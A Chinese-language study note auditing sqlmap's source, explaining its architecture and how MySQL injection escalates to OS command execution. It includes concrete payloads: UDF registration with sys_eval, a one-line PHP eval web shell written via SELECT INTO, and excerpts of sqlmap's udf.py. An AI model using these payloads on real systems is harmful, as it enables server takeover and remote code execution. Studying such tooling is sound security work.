SQLMAP 源码审计
===

研究 sqlmap 源码来尝试充分理解 sql 注入原理;

> 以下主要是基于 MySQL 数据库的分析;

## 基本架构

### 结构分析

1. 入口层: `sqlmap.py`
   
    主函数入口, 初始化全局, 调用控制器 (`controller.py`);

2. 控制层: `controller.py`

    组织扫描生命周期;

3. 核心逻辑层: (`/core/..`)
   
    `lib/core/`:

    - `data.py`: 全局状态 (conf 配置、kb 知识库、paths 等)。
    - `common.py`: 通用工具函数。
    - `option.py`:参数处理。
    - `settings.py`: 常量定义 (payload 模板、超时、默认配置)。

4. 插件层 (DBMS plugins)
   
   `plugins/dbms/`: 根据数据库类型分类

    - `mysql/`, `mssql/`, `oracle/`, `portgresql/` 等
    - 每个目录下有:
      - `enumeration.py`: 枚举信息(用户, 数据库, 版本);
      - `filesystem.py`: 读写文件操作;
      - `fingerprint.py`: DBMS 版本检测;

5. 利用层 (Takeover/Exploitation)
   
    `lib/takeover/`:

    - `abstraction.py`: 抽象命令执行;
    - `udf.py`: 跨数据库的 udf 上传/注册;
    - `web.py`: webshell;

    统一不同 DBMS 的提权/RCE 实现;

6. 请求层 (Request / Injection)

    - `lib/request/`
        - `inject.py`: 核心注入点测试逻辑。
        - `basic.py`: 基础请求。
        - `connect.py`: 目标连接。
        - `templates/`: payload 模板。


7. 工具层 (Utils)
   
   - lib/utils/
        
        - `hash.py`: hash 破解。
        - `payload.py`: payload 构造。
        - `shell.py`: osShell/sqlShell 控制器。

    工具方法 & 交互模式支持;

### 总结

总的来说有三层:

- 用户接口层: 参数解析 + shell 输入
- 控制调度层: controller，决定扫描流程
- 后端执行层: request 发包、plugins 插件实现、takeover 提权

## `-os-shell` 执行任意代码

sqlmap 支持 `--os-shell` 来尝试直接执行系统指令; 

### 手工注入分析

#### UDF 提权

- 原理

**UDF (User Defined Function)**, 也就是**用户自定义函数**, MySQL 允许用 C 写共享库 (`.so` / `.dll`), 放到 `plugin_dir` 下, 再通过 `CREATE FUNCTION` 来注册成 SQL 函数;

换句话说可以构造一个恶意的 UDF 函数, 调用 `sys_eval()` / `sys_exec()` 来执行任意系统命令;

- 前置条件:

1. 需要 `FILE` 权限 或 `SUPER` 权限。
   
2. 需要知道/可写 `plugin_dir` 的路径。在注入中这种全局系统变量通常这样来查:
    ```sql
    UNION SELECT variable_value FROM information_schema.GLOBAL_VARIABLES WHERE variable_name = 'plugin_dir'
    -- 或者 SESSION_VARIABLES 
    ```

3. DB 账户有 `CREATE FUNCTION` 权限;

例如:

```sql
SELECT @@plugin_dir;  
-- 上传恶意 UDF 到 plugin_dir（通过 SQL 注入写文件，或其他手段）  
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so';  
SELECT sys_eval('id');  
```

#### `SELECT .. INTO` 写马

如果 mysql 有 FILE 权限, 直接用:

```sql
... union select 1,'<?php eval($_POST[123]);?>' into '/var/www/html/shell.php'
```

这样的方式写马就行了; 前置条件也很简单, 直到网站根目录, mysql 有写文件权限;

#### 插件 / 组件加载

- 原理:

MySQL 5.1+ 引入 `INSTALL PLUGIN`, 可以动态加载 `.so` 文件; 那么上传一个恶意的 `.so` 文件即可;

- 前置条件:

1. 需要 `SUPER` 权限。 
2. 对 `plugin_dir` 可写。

#### 内置函数间接利用

MySQL 本身没有直接执行系统命令的函数, 但有时能利用:

- `LOAD DATA INFILE` 来进行文件写入辅助;
- 配合 trigger / event / procedure 作持久化控制;

#### 总览

要在 MySQL 注入里实现 RCE, 通常**至少需要满足以下之一**:

1. 数据库用户有 **`FILE` 权限**;
2. 数据库用户有 `SUPER` / `CREATE FUNCTION` 权限, 能上传 `.so` / `.dll` 文件来进行 UDF 系统命令执行;
3. 配置不当, 如 `secure_file_priv`, 使得数据库可以往其他路径写入文件;

### 源码分析

sqlmap 对这部分进行了封装, 大致来说: `/lib/core/shell.py` 为输入法 / 历史记录; 真正的处理后端在提权部分位于 `lib.takeover.udf` 等文件中:

#### `udf.py`

关键代码:

- 默认调用 `sys_exec()` 来执行 UDF, 此处需要注入点支持 `;` + 堆叠查询 (stacked queries) ;

```python
def udfExecCmd(self, cmd, silent=False, udfName=None):
    if udfName is None:
        udfName = "sys_exec"
    cmd = unescaper.escape(self.udfForgeCmd(cmd))
    return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)
```

- 尝试捕获 UDF 结果:

    利用一个辅助中转表, 先插再查来实现类似回显的效果; 
    
> `sys_exec()` 这个函数是只执行, 不回显, 而 `sys_eval()` 能返回执行结果, 但不同 DB 行为差异很大, 可能存在截断或者乱码等; 因此 sqlmap 这里使用了一个辅助中转表;

```python
def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
    if udfName is None:
        udfName = "sys_eval"
    ...
    inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
    output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), ...))
    inject.goStacked("DELETE FROM %s" % self.cmdTblName)
```

-   上传共享库 (核心步骤)

```python
def udfInjectCore(self, udfDict):
    self.udfSetRemotePath()  # 目标服务器共享库存放路径
    checkFile(self.udfLocalFile)
    written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", forceCheck=True)
    ...
    self.udfCreateFromSharedLib(udf, inpRet)
```

首先由 DBMS 插件确定远程路径; 然后上传并记录 `.so` 文件, 然后注册为 udf;

- 用户交互式创建 UDF:

```python
def udfInjectCustom(self):
    if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):
        ...
    if not isStackingAvailable() and not conf.direct:
        ...
    if not conf.shLib:
        self.udfLocalFile = readInput("what is the local path of the shared library?")
    ...
    self.udfs[udfName] = { "input": [...], "return": retType }
    success = self.udfInjectCore(self.udfs)
```

可以手动指定共享库路径, 和 udf 的名字, 参数, 返回值;